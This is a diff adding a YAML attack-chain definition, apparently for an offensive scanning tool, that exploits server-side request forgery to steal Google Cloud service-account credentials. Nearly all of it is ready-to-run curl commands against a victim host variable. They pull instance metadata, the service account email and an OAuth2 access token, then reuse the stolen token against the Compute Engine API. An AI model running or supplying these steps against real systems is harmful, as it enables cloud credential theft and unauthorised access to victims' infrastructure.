@@ -1,0 +1,43 @@
+chain_id: gcp_metadata_via_ssrf
+title: "GCP — pull instance metadata + service-account token via SSRF"
+severity: CRITICAL
+tags: [gcp, cloud, ssrf, metadata, credentials]
+
+trigger:
+  any_of:
+    - { kind: "gcp-imds-target" }
+    - { path_pattern: "(?i)/(fetch|proxy|preview|render|callback|webhook|url=)" }
+
+description: |
+  GCE / Cloud Run / Cloud Functions / Cloud Build instances expose
+  metadata.google.internal (also reachable as 169.254.169.254). The
+  service-account access token there is the credential of the workload
+  itself — use it from your laptop with curl + Bearer.
+
+steps:
+  - id: 1
+    title: "Required header — Metadata-Flavor: Google"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/" \
+        -H 'Metadata-Flavor: Google'
+
+  - id: 2
+    title: "Pull the active service account's email"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
+        -H 'Metadata-Flavor: Google'
+
+  - id: 3
+    title: "Pull an OAuth2 access token"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+        -H 'Metadata-Flavor: Google'
+
+  - id: 4
+    title: "Use the token directly with gcloud / curl"
+    command: |
+      curl -s -H 'Authorization: Bearer <ACCESS_TOKEN>' \
+        https://compute.googleapis.com/compute/v1/projects/$PROJECT/zones/-/instances
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
